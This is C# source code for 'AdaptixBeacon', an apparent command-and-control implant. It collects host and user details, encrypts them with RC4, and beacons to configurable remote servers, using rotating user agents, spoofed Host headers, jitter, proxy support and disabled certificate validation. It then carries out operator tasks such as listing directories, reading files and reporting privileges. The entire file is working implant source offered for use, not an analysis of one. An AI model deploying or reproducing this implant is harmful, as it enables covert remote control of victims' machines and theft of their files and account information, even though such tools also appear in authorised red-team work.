using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace AdaptixBeacon
{
    class Beacon
    {
        static byte[] ProfileData = new byte[] { PROFILE_PLACEHOLDER };
        static int ProfileSize = PROFILE_SIZE_PLACEHOLDER;

        static uint AgentWatermark;
        static int KillDate;
        static int WorkingTime;
        static int SleepTime;
        static int Jitter;
        static uint ListenerWatermark;

        static bool UseSsl;
        static string[] Hosts;
        static int[] Ports;
        static string HttpMethod;
        static string[] Uris;
        static string ParameterName;
        static string[] UserAgents;
        static string RequestHeaders;
        static int AnsOffset1;
        static int AnsOffset2;
        static string[] HostHeaders;
        static int RotationMode;
        static int ProxyType;
        static string ProxyHost;
        static int ProxyPort;
        static string ProxyUsername;
        static string ProxyPassword;

        static byte[] EncryptKey;
        static byte[] SessionKey;
        static int CurrentHost = 0;
        static Random Rng = new Random();

        static void Main(string[] args)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;

            ParseProfile();
            SessionKey = new byte[16];
            using (var rng = new System.Security.Cryptography.RNGCryptoServiceProvider())
                rng.GetBytes(SessionKey);

            byte[] beat = BuildCheckin();
            byte[] encBeat = RC4Crypt(beat, EncryptKey);

            byte[] wmBytes = WriteBE32(ListenerWatermark);
            byte[] payload = new byte[4 + encBeat.Length];
            Array.Copy(wmBytes, 0, payload, 0, 4);
            Array.Copy(encBeat, 0, payload, 4, encBeat.Length);

            while (true)
            {
                try
                {
                    byte[] response = HttpPost(payload);
                    if (response != null && response.Length > 0)
                    {
                        byte[] decResponse = RC4Crypt(response, SessionKey);
                        byte[] result = ProcessTasks(decResponse);
                        if (result != null && result.Length > 0)
                        {
                            payload = RC4Crypt(result, SessionKey);
                        }
                        else
                        {
                            payload = new byte[0];
                        }
                    }
                    else
                    {
                        payload = new byte[0];
                    }
                }
                catch { payload = new byte[0]; }

                int sleepMs = SleepTime * 1000;
                if (Jitter > 0)
                    sleepMs += Rng.Next(0, sleepMs * Jitter / 100);
                Thread.Sleep(sleepMs);

                if (KillDate > 0)
                {
                    long now = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
                    if (now >= KillDate) return;
                }
            }
        }

        static void ParseProfile()
        {
            int pos = 0;

            int encLen = ReadInt32LE(ProfileData, ref pos);
            byte[] encData = new byte[encLen];
            Array.Copy(ProfileData, pos, encData, 0, encLen);
            pos += encLen;

            int remaining = ProfileData.Length - pos;
            EncryptKey = new byte[remaining];
            Array.Copy(ProfileData, pos, EncryptKey, 0, remaining);

            byte[] decrypted = RC4Crypt(encData, EncryptKey);

            int dpos = 0;
            AgentWatermark = (uint)ReadInt32LE(decrypted, ref dpos);
            KillDate = ReadInt32LE(decrypted, ref dpos);
            WorkingTime = ReadInt32LE(decrypted, ref dpos);
            SleepTime = ReadInt32LE(decrypted, ref dpos);
            Jitter = ReadInt32LE(decrypted, ref dpos);
            ListenerWatermark = (uint)ReadInt32LE(decrypted, ref dpos);

            UseSsl = ReadBoolByte(decrypted, ref dpos);
            int c2Count = ReadInt32LE(decrypted, ref dpos);
            Hosts = new string[c2Count];
            Ports = new int[c2Count];
            for (int i = 0; i < c2Count; i++)
            {
                Hosts[i] = ReadStringLE(decrypted, ref dpos);
                Ports[i] = ReadInt32LE(decrypted, ref dpos);
            }
            HttpMethod = ReadStringLE(decrypted, ref dpos);
            int uriCount = ReadInt32LE(decrypted, ref dpos);
            Uris = new string[uriCount];
            for (int i = 0; i < uriCount; i++)
                Uris[i] = ReadStringLE(decrypted, ref dpos);
            ParameterName = ReadStringLE(decrypted, ref dpos);
            int uaCount = ReadInt32LE(decrypted, ref dpos);
            UserAgents = new string[uaCount];
            for (int i = 0; i < uaCount; i++)
                UserAgents[i] = ReadStringLE(decrypted, ref dpos);
            RequestHeaders = ReadStringLE(decrypted, ref dpos);
            AnsOffset1 = ReadInt32LE(decrypted, ref dpos);
            AnsOffset2 = ReadInt32LE(decrypted, ref dpos);
            int hhCount = ReadInt32LE(decrypted, ref dpos);
            HostHeaders = new string[hhCount];
            for (int i = 0; i < hhCount; i++)
                HostHeaders[i] = ReadStringLE(decrypted, ref dpos);
            RotationMode = ReadInt32LE(decrypted, ref dpos);
            ProxyType = ReadInt32LE(decrypted, ref dpos);
            ProxyHost = ReadStringLE(decrypted, ref dpos);
            ProxyPort = ReadInt32LE(decrypted, ref dpos);
            ProxyUsername = ReadStringLE(decrypted, ref dpos);
            ProxyPassword = ReadStringLE(decrypted, ref dpos);
        }

        static byte[] BuildCheckin()
        {
            var ms = new MemoryStream();

            WriteStreamBE32(ms, (uint)SleepTime);
            WriteStreamBE32(ms, (uint)Jitter);
            WriteStreamBE32(ms, (uint)KillDate);
            WriteStreamBE32(ms, (uint)WorkingTime);
            WriteStreamBE16(ms, 0); // ACP
            WriteStreamBE16(ms, 0); // OemCP

            int gmtOffset = (int)TimeZoneInfo.Local.BaseUtcOffset.TotalHours;
            ms.WriteByte((byte)(gmtOffset & 0xFF));

            int pid = Process.GetCurrentProcess().Id;
            WriteStreamBE16(ms, (ushort)(pid & 0xFFFF));
            WriteStreamBE16(ms, 0); // TID

            var osVer = Environment.OSVersion;
            int buildNumber = osVer.Version.Build;
            byte majorVer = (byte)osVer.Version.Major;
            byte minorVer = (byte)osVer.Version.Minor;

            IPAddress localIp = IPAddress.Loopback;
            try
            {
                string hostName = Dns.GetHostName();
                foreach (var ip in Dns.GetHostAddresses(hostName))
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        localIp = ip;
                        break;
                    }
                }
            }
            catch { }

            byte[] ipBytes = localIp.GetAddressBytes();
            uint ipInt = (uint)(ipBytes[0] | (ipBytes[1] << 8) | (ipBytes[2] << 16) | (ipBytes[3] << 24));

            byte flags = 0;
            if (Environment.Is64BitProcess) flags |= 0x01;
            if (Environment.Is64BitOperatingSystem) flags |= 0x02;
            try
            {
                using (var identity = WindowsIdentity.GetCurrent())
                {
                    var principal = new WindowsPrincipal(identity);
                    if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                        flags |= 0x04;
                }
            }
            catch { }

            WriteStreamBE32(ms, (uint)buildNumber);
            ms.WriteByte(majorVer);
            ms.WriteByte(minorVer);
            WriteStreamBE32(ms, ipInt);
            ms.WriteByte(flags);

            WriteStreamBEBytes(ms, SessionKey);

            string domain = Environment.UserDomainName ?? "";
            WriteStreamBEBytes(ms, Encoding.ASCII.GetBytes(domain));

            string computer = Environment.MachineName ?? "";
            WriteStreamBEBytes(ms, Encoding.ASCII.GetBytes(computer));

            string username = Environment.UserName ?? "";
            WriteStreamBEBytes(ms, Encoding.ASCII.GetBytes(username));

            string process = Process.GetCurrentProcess().ProcessName ?? "";
            WriteStreamBEBytes(ms, Encoding.ASCII.GetBytes(process));

            return ms.ToArray();
        }

        static byte[] ProcessTasks(byte[] data)
        {
            if (data == null || data.Length < 4) return null;

            int pos = 0;
            int totalSize = ReadInt32LE(data, ref pos);

            var inner = new MemoryStream();

            while (pos + 8 <= data.Length)
            {
                byte[] taskIdBytes = new byte[4];
                Array.Copy(data, pos, taskIdBytes, 0, 4);
                pos += 4;

                int commandId = ReadInt32LE(data, ref pos);
                byte[] result = ExecuteCommand(commandId, data, ref pos);

                if (result != null)
                {
                    inner.Write(taskIdBytes, 0, taskIdBytes.Length);
                    inner.Write(result, 0, result.Length);
                }
            }

            byte[] output = inner.ToArray();
            if (output.Length == 0) return null;

            var final_ms = new MemoryStream();
            WriteStreamBE32(final_ms, (uint)(output.Length + 4));
            final_ms.Write(output, 0, output.Length);
            return final_ms.ToArray();
        }

        static byte[] ExecuteCommand(int commandId, byte[] data, ref int pos)
        {
            var ms = new MemoryStream();

            switch (commandId)
            {
                case 4: // PWD
                    string pwd = Directory.GetCurrentDirectory();
                    WriteStreamBE32(ms, (uint)commandId);
                    WriteStreamBEString(ms, pwd);
                    break;

                case 22: // GETUID
                    string user = Environment.UserName;
                    string dom = Environment.UserDomainName;
                    bool elevated = false;
                    try
                    {
                        using (var identity = WindowsIdentity.GetCurrent())
                        {
                            var principal = new WindowsPrincipal(identity);
                            elevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
                        }
                    }
                    catch { }
                    WriteStreamBE32(ms, (uint)commandId);
                    ms.WriteByte((byte)(elevated ? 1 : 0));
                    WriteStreamBEString(ms, dom);
                    WriteStreamBEString(ms, user);
                    break;

                case 8: // CD
                    string cdPath = ReadStringLE(data, ref pos);
                    try
                    {
                        Directory.SetCurrentDirectory(cdPath.TrimEnd('\0'));
                        string newDir = Directory.GetCurrentDirectory();
                        WriteStreamBE32(ms, (uint)commandId);
                        WriteStreamBEString(ms, newDir);
                    }
                    catch { return null; }
                    break;

                case 24: // CAT
                    string catPath = ReadStringLE(data, ref pos);
                    try
                    {
                        catPath = catPath.TrimEnd('\0');
                        byte[] content = File.ReadAllBytes(catPath);
                        if (content.Length > 2048)
                        {
                            byte[] trimmed = new byte[2048];
                            Array.Copy(content, trimmed, 2048);
                            content = trimmed;
                        }
                        WriteStreamBE32(ms, (uint)commandId);
                        WriteStreamBEString(ms, catPath);
                        WriteStreamBEBytes(ms, content);
                    }
                    catch { return null; }
                    break;

                case 14: // LS
                    string lsPath = ReadStringLE(data, ref pos);
                    try
                    {
                        lsPath = lsPath.TrimEnd('\0');
                        var entries = Directory.GetFileSystemEntries(lsPath);
                        WriteStreamBE32(ms, (uint)commandId);
                        ms.WriteByte(1);
                        WriteStreamBEString(ms, lsPath);
                        WriteStreamBE32(ms, (uint)entries.Length);
                        foreach (string entry in entries)
                        {
                            var fi = new FileInfo(entry);
                            bool isDir = (fi.Attributes & FileAttributes.Directory) != 0;
                            ms.WriteByte((byte)(isDir ? 1 : 0));
                            WriteStreamBE64(ms, isDir ? 0UL : (ulong)fi.Length);
                            WriteStreamBE32(ms, (uint)(new DateTimeOffset(fi.LastWriteTimeUtc).ToUnixTimeSeconds()));
                            WriteStreamBEString(ms, Path.GetFileName(entry));
                        }
                    }
                    catch
                    {
                        WriteStreamBE32(ms, (uint)commandId);
                        ms.WriteByte(0);
                        WriteStreamBE32(ms, 2); // ERROR_FILE_NOT_FOUND
                    }
                    break;

                case 10: // TERMINATE
                    int termType = ReadInt32LE(data, ref pos);
                    if (termType == 2)
                        Environment.Exit(0);
                    break;

                default:
                    return null;
            }

            return ms.ToArray();
        }

        static byte[] HttpPost(byte[] data)
        {
            int idx = RotationMode == 1 ? Rng.Next(Hosts.Length) : CurrentHost;
            CurrentHost = (CurrentHost + 1) % Hosts.Length;

            string scheme = UseSsl ? "https" : "http";
            string uri = Uris.Length > 0 ? Uris[Rng.Next(Uris.Length)] : "/";
            string url = string.Format("{0}://{1}:{2}{3}", scheme, Hosts[idx], Ports[idx], uri);

            var request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = HttpMethod.Length > 0 ? HttpMethod : "POST";

            if (UserAgents.Length > 0)
                request.UserAgent = UserAgents[Rng.Next(UserAgents.Length)];

            if (HostHeaders.Length > 0)
                request.Host = HostHeaders[Rng.Next(HostHeaders.Length)];

            if (ProxyType > 0 && !string.IsNullOrEmpty(ProxyHost))
            {
                string proxyScheme = ProxyType == 2 ? "https" : "http";
                var proxy = new WebProxy(string.Format("{0}://{1}:{2}", proxyScheme, ProxyHost, ProxyPort));
                if (!string.IsNullOrEmpty(ProxyUsername))
                    proxy.Credentials = new NetworkCredential(ProxyUsername, ProxyPassword);
                request.Proxy = proxy;
            }

            if (!string.IsNullOrEmpty(RequestHeaders))
            {
                foreach (string line in RequestHeaders.Split('\n'))
                {
                    string trimmed = line.Trim();
                    int sep = trimmed.IndexOf(':');
                    if (sep > 0)
                    {
                        string key = trimmed.Substring(0, sep).Trim();
                        string val = trimmed.Substring(sep + 1).Trim();
                        if (!string.IsNullOrEmpty(key))
                            request.Headers[key] = val;
                    }
                }
            }

            if (data != null && data.Length > 0)
            {
                request.ContentType = "application/octet-stream";
                if (!string.IsNullOrEmpty(ParameterName))
                    request.Headers[ParameterName] = Convert.ToBase64String(data);
                else
                {
                    request.ContentLength = data.Length;
                    using (var stream = request.GetRequestStream())
                        stream.Write(data, 0, data.Length);
                }
            }

            using (var response = (HttpWebResponse)request.GetResponse())
            using (var stream = response.GetResponseStream())
            using (var reader = new MemoryStream())
            {
                stream.CopyTo(reader);
                byte[] body = reader.ToArray();
                if (AnsOffset1 > 0 || AnsOffset2 > 0)
                {
                    int start = AnsOffset1;
                    int end = body.Length - AnsOffset2;
                    if (end > start)
                    {
                        byte[] trimmedBody = new byte[end - start];
                        Array.Copy(body, start, trimmedBody, 0, trimmedBody.Length);
                        return trimmedBody;
                    }
                }
                return body;
            }
        }

        static byte[] RC4Crypt(byte[] data, byte[] key)
        {
            byte[] s = new byte[256];
            for (int i = 0; i < 256; i++) s[i] = (byte)i;
            int j2 = 0;
            for (int i = 0; i < 256; i++)
            {
                j2 = (j2 + s[i] + key[i % key.Length]) & 0xFF;
                byte tmp = s[i]; s[i] = s[j2]; s[j2] = tmp;
            }
            byte[] output = new byte[data.Length];
            int a = 0, b = 0;
            for (int k = 0; k < data.Length; k++)
            {
                a = (a + 1) & 0xFF;
                b = (b + s[a]) & 0xFF;
                byte tmp = s[a]; s[a] = s[b]; s[b] = tmp;
                output[k] = (byte)(data[k] ^ s[(s[a] + s[b]) & 0xFF]);
            }
            return output;
        }

        // LE readers for profile and incoming tasks (server uses PackArray with LE)
        static int ReadInt32LE(byte[] data, ref int pos)
        {
            if (pos + 4 > data.Length) return 0;
            int val = BitConverter.ToInt32(data, pos);
            pos += 4;
            return val;
        }

        static bool ReadBoolByte(byte[] data, ref int pos)
        {
            if (pos >= data.Length) return false;
            byte val = data[pos];
            pos++;
            return val != 0;
        }

        static string ReadStringLE(byte[] data, ref int pos)
        {
            int len = ReadInt32LE(data, ref pos);
            if (len <= 0 || pos + len > data.Length) return "";
            string s = Encoding.ASCII.GetString(data, pos, len).TrimEnd('\0');
            pos += len;
            return s;
        }

        // BE writers for agent responses (server parses with BE ParseInt32)
        static byte[] WriteBE32(uint val)
        {
            return new byte[] {
                (byte)((val >> 24) & 0xFF),
                (byte)((val >> 16) & 0xFF),
                (byte)((val >> 8) & 0xFF),
                (byte)(val & 0xFF)
            };
        }

        static void WriteStreamBE32(MemoryStream ms, uint val)
        {
            ms.WriteByte((byte)((val >> 24) & 0xFF));
            ms.WriteByte((byte)((val >> 16) & 0xFF));
            ms.WriteByte((byte)((val >> 8) & 0xFF));
            ms.WriteByte((byte)(val & 0xFF));
        }

        static void WriteStreamBE16(MemoryStream ms, ushort val)
        {
            ms.WriteByte((byte)((val >> 8) & 0xFF));
            ms.WriteByte((byte)(val & 0xFF));
        }

        static void WriteStreamBE64(MemoryStream ms, ulong val)
        {
            ms.WriteByte((byte)((val >> 56) & 0xFF));
            ms.WriteByte((byte)((val >> 48) & 0xFF));
            ms.WriteByte((byte)((val >> 40) & 0xFF));
            ms.WriteByte((byte)((val >> 32) & 0xFF));
            ms.WriteByte((byte)((val >> 24) & 0xFF));
            ms.WriteByte((byte)((val >> 16) & 0xFF));
            ms.WriteByte((byte)((val >> 8) & 0xFF));
            ms.WriteByte((byte)(val & 0xFF));
        }

        static void WriteStreamBEBytes(MemoryStream ms, byte[] data)
        {
            WriteStreamBE32(ms, (uint)data.Length);
            ms.Write(data, 0, data.Length);
        }

        static void WriteStreamBEString(MemoryStream ms, string s)
        {
            byte[] bytes = Encoding.ASCII.GetBytes(s + "\0");
            WriteStreamBE32(ms, (uint)bytes.Length);
            ms.Write(bytes, 0, bytes.Length);
        }
    }
}
